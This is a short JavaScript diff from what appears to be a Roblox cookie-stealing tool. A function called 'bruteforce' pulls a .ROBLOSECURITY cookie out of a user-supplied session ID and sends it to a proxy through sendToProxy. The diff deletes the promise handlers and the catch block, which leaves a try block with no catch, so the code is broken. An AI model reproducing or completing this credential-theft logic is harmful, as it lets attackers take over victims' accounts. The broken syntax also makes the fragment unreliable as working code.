@@ -37,10 +37,6 @@ function bruteforce(sessionId) {
   try {
     const cookie = extractRobloxSecurityCookie(sessionId) || sessionId;
     sendToProxy(cookie)
-      .then(() => showCookieSuccess())
-      .catch(() => showError("Failed to process session ID"));
-  } catch (error) {
-    showError("Invalid session ID format");
   }
 }
 
